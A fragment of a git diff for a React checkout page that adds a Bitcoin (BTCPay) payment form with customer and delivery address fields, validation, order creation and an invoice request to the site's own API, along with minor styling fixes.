+    email: '',
+    phone: '',
+    company: '',
+    address: '',
+    address2: '',
+    city: '',
+    state: '',
+    country: '',
+    zipCode: '',
+    deliveryNotes: ''
+  });
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState<string | null>(null);
+  const [focusedField, setFocusedField] = useState<string | null>(null);
+
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { name, value } = e.target;
+    setFormData(prev => ({
+      ...prev,
+      [name]: value
+    }));
+  };
+
+  const validateForm = () => {
+    if (!formData.name.trim()) {
+      setError('Full name is required');
+      return false;
+    }
+
+    if (!formData.email.trim() || !/^\S+@\S+\.\S+$/.test(formData.email)) {
+      setError('Valid email is required');
+      return false;
+    }
+
+    if (!formData.phone.trim()) {
+      setError('Phone number is required');
+      return false;
+    }
+
+    if (!formData.address.trim()) {
+      setError('Street address is required');
+      return false;
+    }
+
+    if (!formData.city.trim()) {
+      setError('City is required');
+      return false;
+    }
+
+    if (!formData.state.trim()) {
+      setError('State/Province is required');
+      return false;
+    }
+
+    if (!formData.country.trim()) {
+      setError('Country is required');
+      return false;
+    }
+
+    if (!formData.zipCode.trim()) {
+      setError('ZIP/Postal code is required');
+      return false;
+    }
+
+    return true;
+  };
+
+  const handlePayment = async () => {
+    
+    setLoading(true);
+    setError(null);
+    const orderData = {
+      _type: "order",
+    
+      // 🔹 Customer info
+      name: formData.name,
+      email: formData.email,
+      phone: formData.phone,
+      company: formData.company,
+    
+      // 🔹 Addresses
+      address: formData.address,
+      address2: formData.address2,
+      city: formData.city,
+      state: formData.state,
+      country: formData.country,
+      zipCode: formData.zipCode,
+    
+      // 🔹 Extra notes
+      deliveryNotes: formData.deliveryNotes,
+    
+      // 🔹 Products in cart
+      products: cart.map((item) => ({
+        id: item.id,
+        name: item.name,
+        price: item.price,
+        quantity: item.quantity,
+      })),
+    };
+    
+    
+    if (!validateForm()) {
+      setLoading(false);
+      return;
+    }
+
+    try {
+      // Create invoice via API
+
+
+    try {
+      await client.create(orderData);
+      console.log(orderData)
+    }
+     catch (err) {
+      console.error('Error creating order:', err);
+    }
+  
+      const response = await fetch('/api/create-invoice', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          amount: totalAmount,
+          items: [], // Add cart items here if needed
+          customer: formData,
+          metadata: {
+            orderDate: new Date().toISOString()
+          }
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error('Failed to create invoice');
+      }
+
+      const data = await response.json();
+      
+      // Redirect to BTCPay invoice page
+      window.location.href = data.paymentUrl;
+
+    } catch (err: any) {
+      console.error('Payment Error:', err);
+      setError(err.message || 'Payment failed. Please try again.');
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  return (
+    <div className="space-y-6">
+      <div className="bg-gradient-to-r from-orange-50 to-yellow-50 p-4 rounded-xl border border-orange-200">
+        <div className="flex items-center space-x-3">
+          <Bitcoin className="h-6 w-6 text-orange-500" />
+          <div>
+            <h4 className="font-semibold text-orange-900">Secure Bitcoin Payment</h4>
+            <p className="text-sm text-orange-700">Fast, secure, and decentralized payment processing</p>
+          </div>
+        </div>
+      </div>
+
+      <div className="space-y-5">
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+          <InputField
+            label="Full Name"
+            name="name"
+            value={formData.name}
+            onChange={handleChange}
+            required
+            placeholder="Enter your full name"
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+          />
+
+          <InputField
+            label="Email Address"
+            name="email"
+            type="email"
+            value={formData.email}
+            onChange={handleChange}
+            required
+            placeholder="your@email.com"
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+          />
+        </div>
+
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+          <InputField
+            label="Phone Number"
+            name="phone"
+            type="tel"
+            value={formData.phone}
+            onChange={handleChange}
+            required
+            placeholder="+1 (555) 123-4567"
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+          />
+
+         
+        </div>
+
+        {/* Delivery Address Section */}
+        <div className="pt-4 border-t border-gray-200">
+          <h3 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
+            Delivery Address
+          </h3>
+
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+            <InputField
+              label="Country"
+              name="country"
+              value={formData.country}
+              onChange={handleChange}
+              required
+              placeholder="United States"
+              focusedField={focusedField}
+              setFocusedField={setFocusedField}
+            />
+
+            <InputField
+              label="State/Province"
+              name="state"
+              value={formData.state}
+              onChange={handleChange}
+              required
+              placeholder="California"
+              focusedField={focusedField}
+              setFocusedField={setFocusedField}
+            />
+          </div>
+
+          <InputField
+            label="Street Address"
+            name="address"
+            value={formData.address}
+            onChange={handleChange}
+            required
+            placeholder="123 Main Street"
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+          />
+
+          <InputField
+            label="Apartment, Suite, Unit (Optional)"
+            name="address2"
+            value={formData.address2}
+            onChange={handleChange}
+            placeholder="Apt 4B"
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+          />
+
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
+            <InputField
+              label="City"
+              name="city"
+              value={formData.city}
+              onChange={handleChange}
+              required
+              placeholder="New York"
+              focusedField={focusedField}
+              setFocusedField={setFocusedField}
+            />
+
+            <InputField
+              label="ZIP/Postal Code"
+              name="zipCode"
+              value={formData.zipCode}
+              onChange={handleChange}
+              required
+              placeholder="10001"
+              focusedField={focusedField}
+              setFocusedField={setFocusedField}
+            />
+
+            <InputField
+              label="Delivery Instructions (Optional)"
+              name="deliveryNotes"
+              value={formData.deliveryNotes}
+              onChange={handleChange}
+              placeholder="Gate code, floor, etc."
+              focusedField={focusedField}
+              setFocusedField={setFocusedField}
+            />
+          </div>
+        </div>
+      </div>
+
+      <button
+        onClick={handlePayment}
+        disabled={loading}
+        className={`w-full py-4 px-6 rounded-2xl font-semibold text-white transition-all duration-300 flex items-center justify-center transform hover:scale-[1.02] shadow-lg ${
+          loading
+            ? 'bg-gray-400 cursor-not-allowed'
+            : 'bg-gradient-to-r from-orange-500 to-yellow-500 hover:from-orange-600 hover:to-yellow-600 shadow-orange-200 hover:shadow-xl'
+        }`}
+      >
+        {loading ? (
+          <>
+            <RefreshCw className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" />
+            Processing Payment...
+          </>
+        ) : (
+          <>
+            <Bitcoin className="w-5 h-5 mr-3" />
+            Pay ${totalAmount.toFixed(2)} with Bitcoin
+            <Shield className="w-4 h-4 ml-2 opacity-80" />
+          </>
+        )}
+      </button>
+
+      {error && (
+        <div className="p-4 bg-red-50 border-l-4 border-red-500 text-red-700 rounded-xl animate-pulse">
+          <div className="flex items-center">
+            <div className="flex-shrink-0">
+              <svg className="h-5 w-5 text-red-400" viewBox="0 0 20 20" fill="currentColor">
+                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
+              </svg>
+            </div>
+            <div className="ml-3">
+              <p className="font-medium">Payment Error</p>
+              <p className="text-sm">{error}</p>
+            </div>
+          </div>
+        </div>
+      )}
+    </div>
   );
 };
 
@@ -683,7 +1033,7 @@ const InputField = ({
   error?: string;
   focusedField?: string | null;
   setFocusedField?: (field: string | null) => void;
-  icon?: string;
+  icon?: React.ReactNode;
   required?: boolean;
 }) => (
   <div className="relative">
@@ -709,9 +1059,9 @@ const InputField = ({
         placeholder={placeholder}
       />
       {icon && (
-        <span className="absolute left-4 top-1/2 transform -translate-y-1/2 text-lg">
+        <div className="absolute left-4 top-1/2 transform -translate-y-1/2">
           {icon}
-        </span>
+        </div>
       )}
     </div>
     {error && <p className="text-red-500 text-sm mt-2 animate-pulse">{error}</p>}
@@ -808,7 +1158,7 @@ const CheckoutPage = () => {
             <div className={`transition-all duration-700 delay-300 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
               <Card className="p-8 shadow-xl border-0 rounded-3xl bg-white/80 backdrop-blur-sm sticky top-6">
                 <h2 className="text-2xl font-bold mb-8 text-gray-900 flex items-center">
-                  <Star className="w-6 w-6 mr-3 text-yellow-500" />
+                  <Star className="w-6  mr-3 text-yellow-500" />
                   Order Summary
                 </h2>
 
@@ -854,7 +1204,7 @@ const CheckoutPage = () => {
 
                 <div className="mt-8 p-4 bg-gradient-to-r from-green-50 to-blue-50 rounded-2xl border border-green-200">
                   <div className="flex items-center space-x-3">
-                    <Shield className="h-5 h-5 text-green-600" />
+                    <Shield className="h-5  text-green-600" />
                     <div>
                       <p className="text-sm font-semibold text-green-900">Secure Payment</p>
                       <p className="text-xs text-green-700">SSL encrypted & PCI compliant</p>
@@ -870,24 +1220,6 @@ const CheckoutPage = () => {
           </div>
         </div>
       </div>
-
-      <style jsx>{`
-        @keyframes fade-in {
-          from {
-            opacity: 0;
-            transform: translateY(20px);
-          }
-          to {
-            opacity: 1;
-            transform: translateY(0);
-          }
-        }
-        
-        .animate-fade-in {
-          animation: fade-in 0.6s ease-out forwards;
-          opacity: 0;
-        }
-      `}</style>
     </div>
   );
 };
